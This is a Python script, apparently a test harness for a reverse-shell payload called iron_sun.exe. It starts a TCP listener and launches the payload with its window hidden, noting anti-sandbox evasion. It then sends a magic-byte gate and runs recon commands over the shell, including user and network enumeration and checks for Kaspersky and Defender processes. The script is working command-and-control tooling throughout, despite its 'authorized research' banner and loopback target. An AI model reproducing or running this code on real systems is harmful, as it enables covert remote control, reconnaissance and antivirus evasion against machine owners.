#!/usr/bin/env python3
"""
FLAGSHIP — Live Reverse Shell Proof Runner
Runs in cmd.exe (visible terminal). Starts listener, launches iron_sun.exe,
sends commands, takes mss screenshots at each stage. No GUI needed.
"""
import os, sys, socket, subprocess, time, datetime, threading
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

try:
    import mss
except ImportError:
    subprocess.run([sys.executable, '-m', 'pip', 'install', 'mss', '-q'])
    import mss

GOLD  = "\033[38;2;255;215;0m"
CYAN  = "\033[38;2;0;229;255m"
GREEN = "\033[38;2;0;255;100m"
RED   = "\033[38;2;255;60;60m"
IDF   = "\033[38;2;0;56;184m"
WH    = "\033[38;2;255;255;255m"
DIM   = "\033[38;2;120;120;120m"
RST   = "\033[0m"

ROOT   = os.path.dirname(os.path.abspath(__file__))
IRON   = os.path.join(ROOT, "iron_sun.exe")
SHOTS  = os.path.join(ROOT, "screenshots")
PORT   = 4443
ISUN   = bytes([0x49, 0x53, 0x55, 0x4E])

os.makedirs(SHOTS, exist_ok=True)

def snap(tag):
    ts = datetime.datetime.now().strftime('%H%M%S')
    fname = f"gui_shell_{tag}_{ts}.png"
    fpath = os.path.join(SHOTS, fname)
    with mss.MSS() as sct:
        sct.shot(output=fpath)
    sz = os.path.getsize(fpath)
    print(f"  {DIM}[snap] {fname}  ({sz:,} bytes){RST}")
    return fname

def section(title):
    print(f"\n{GOLD}  ╔{'═'*(len(title)+4)}╗{RST}")
    print(f"{GOLD}  ║  {title}  ║{RST}")
    print(f"{GOLD}  ╚{'═'*(len(title)+4)}╝{RST}\n")

def recv_all(c, timeout=6):
    c.settimeout(timeout)
    buf = b""
    try:
        while True:
            chunk = c.recv(4096)
            if not chunk:
                break
            buf += chunk
    except Exception:
        pass
    return buf.decode("utf-8", errors="replace").strip()

# ── Banner ────────────────────────────────────────────────────────────────────
print()
print(CYAN + f"  {'═'*68}" + RST)
print(GOLD + f"  {'✡  FLAGSHIP — IRON-SUN LIVE SHELL PROOF — RADON  ✡':^68}" + RST)
print(GOLD + f"  {'22DIV VADER  ·  OWN HARDWARE ONLY  ·  AUTHORIZED RESEARCH':^68}" + RST)
print(CYAN + f"  {'═'*68}" + RST)
print(f"\n  {CYAN}Time:{RST}     {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print(f"  {CYAN}Machine:{RST}  {os.environ.get('COMPUTERNAME','Radon_Laptop1')}")
print(f"  {CYAN}Target:{RST}   127.0.0.1:{PORT}  (loopback)")
print(f"  {CYAN}Payload:{RST}  {IRON}")
print(f"  {CYAN}Size:{RST}     106,857 bytes  ·  gcc 15.2.0 MinGW PE")
print(f"  {CYAN}ISUN:{RST}     [0x49 0x53 0x55 0x4E]  (magic gate)")
print()

# Stage 1: screenshot at start
snap("1_start")
time.sleep(1)

# ── Listener ──────────────────────────────────────────────────────────────────
section("STAGE 1 — TCP LISTENER  0.0.0.0:4443")
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
try:
    srv.bind(("0.0.0.0", PORT))
except OSError as e:
    print(f"  {RED}[!] bind error: {e}{RST}")
    print(f"  {DIM}trying again after 2s...{RST}")
    time.sleep(2)
    srv.bind(("0.0.0.0", PORT))
srv.listen(1)
srv.settimeout(60)
print(f"  {GREEN}[+]{RST} Listener UP  0.0.0.0:{PORT}")
snap("2_listener_up")
time.sleep(0.5)

# ── Launch iron_sun.exe ───────────────────────────────────────────────────────
section("STAGE 2 — LAUNCH iron_sun.exe")
proc = subprocess.Popen([IRON], creationflags=subprocess.CREATE_NO_WINDOW)
print(f"  {GREEN}[+]{RST} iron_sun.exe launched  {GOLD}PID {proc.pid}{RST}")
print(f"  {DIM}     Anti-sandbox sleep active (jitter 2-5s) ...{RST}")
snap("3_payload_launched")

# ── Wait for callback ─────────────────────────────────────────────────────────
section("STAGE 3 — WAITING FOR CALLBACK")
print(f"  {DIM}  Waiting for iron_sun.exe to call back on 127.0.0.1:{PORT}...{RST}")
print(f"  {DIM}  (anti-sandbox: sleep + GetSystemMetrics + GetDiskFreeSpaceExA){RST}")
try:
    conn, addr = srv.accept()
except socket.timeout:
    print(f"\n  {RED}[!] TIMEOUT — no callback{RST}")
    sys.exit(1)

print(f"\n  {GREEN}[+]  TCP CONNECTED  {GOLD}{addr[0]}:{addr[1]}{RST}")
snap("4_connected")
time.sleep(0.3)

# ── ISUN magic gate ───────────────────────────────────────────────────────────
section("STAGE 4 — ISUN MAGIC GATE")
conn.sendall(ISUN)
print(f"  {GREEN}[→]{RST} Sent ISUN gate bytes  {DIM}[0x49 0x53 0x55 0x4E]{RST}")
time.sleep(0.7)
recv_all(conn, timeout=3)   # drain banner

conn.sendall(b"echo IRON_SUN_GATE_OPEN\r\n")
time.sleep(0.3)
resp = recv_all(conn, timeout=5)
if "IRON_SUN_GATE_OPEN" in resp:
    print(f"  {GREEN}[✓]{RST} Gate verified  {GOLD}cmd.exe shell responding{RST}")
else:
    print(f"  {DIM}Gate resp: {repr(resp[:60])}{RST}")
snap("5_gate_open")
time.sleep(0.5)

# ── Fire commands ─────────────────────────────────────────────────────────────
section("STAGE 5 — LIVE SHELL RECON COMMANDS")
CMDS = [
    ("whoami",                                        "identity"),
    ("hostname",                                      "hostname"),
    ("ipconfig",                                      "network"),
    ("echo IRON_SUN_VNC_WATCH_3_PROOF_RADON_22DIV",  "VNC proof marker"),
    ("tasklist /fi \"imagename eq avp*\"",            "AV check"),
    ("tasklist /fi \"imagename eq MsMpEng*\"",        "Defender check"),
    ("net user",                                      "local users"),
    ("dir C:\\Users",                                 "user dirs"),
    ("systeminfo | findstr /C:\"OS Name\"",           "OS fingerprint"),
]

results = []
for cmd, label in CMDS:
    print(f"\n  {GOLD}RADON> {WH}{cmd}{RST}")
    conn.sendall((cmd + "\r\n").encode())
    time.sleep(0.3)
    out = recv_all(conn, timeout=6)
    lines = [l for l in out.splitlines() if l.strip()][:5]
    for ln in lines:
        print(f"  {GREEN}{ln}{RST}")
    results.append((cmd, label, '\n'.join(lines)))
    print(f"  {DIM}  ─── {label} ───{RST}")
    time.sleep(0.3)

print()
snap("6_shell_recon")
time.sleep(1)

# ── Summary ───────────────────────────────────────────────────────────────────
section("STAGE 6 — SESSION COMPLETE")
ts_done = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
print(f"  {GOLD}VERDICT: PASS — iron_sun TCP reverse shell confirmed on RADON{RST}")
print(f"  {GREEN}Commands fired: {len(CMDS)}{RST}")
print(f"  {CYAN}ISUN gate:      verified{RST}")
print(f"  {CYAN}cmd.exe PID:    {proc.pid}{RST}")
print(f"  {CYAN}Time:           {ts_done}{RST}")
print(f"  {CYAN}Machine:        {os.environ.get('COMPUTERNAME','Radon_Laptop1')}{RST}")
print()

# Final results dump
print(GOLD + "  ┌─── COMMAND RESULTS ───────────────────────────────────────┐" + RST)
for cmd, label, out in results:
    first = out.splitlines()[0].strip() if out else "(no output)"
    print(f"  {DIM}│  {label:<20}  {GREEN}{first[:42]}{RST}")
print(GOLD + "  └────────────────────────────────────────────────────────────┘" + RST)
print()

snap("7_complete")

try:
    conn.close()
    proc.terminate()
except Exception:
    pass

print(f"\n{GOLD}  FLAGSHIP v1.2.0 — RADON — {ts_done}{RST}")
print(DIM + "  Standing by 20s for MCP capture ..." + RST)
print()
time.sleep(20)
